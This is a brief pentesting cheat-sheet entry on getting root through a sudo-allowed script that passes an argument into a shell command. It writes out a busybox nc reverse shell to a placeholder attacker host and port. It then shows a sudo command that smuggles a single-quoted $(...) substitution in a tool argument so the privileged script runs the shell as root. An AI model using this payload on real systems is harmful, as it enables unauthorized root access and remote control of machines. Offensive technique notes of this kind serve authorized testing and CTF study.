# sudo Argument Command Substitution (Single-Quoted)

If `sudo -l` lets you run a script/tool with an arbitrary argument, and that argument is later interpolated into a shell command *inside* the privileged script (not just passed as a literal string), single-quoting a `$(...)` on your end stops your own shell from expanding it — so it survives to be evaluated by the root-run script instead:

```bash
echo 'busybox nc <LHOST> <LPORT> -e sh' > /tmp/rev.sh && chmod +x /tmp/rev.sh
sudo /path/to/privileged_tool --some-arg='$(/tmp/rev.sh)'
```
Check for this whenever a sudo-allowed tool takes a `--user`/`--name`/similar string argument that plausibly gets dropped into a backend shell call (common in Perl/Python wrapper scripts using `os.system`/backticks).
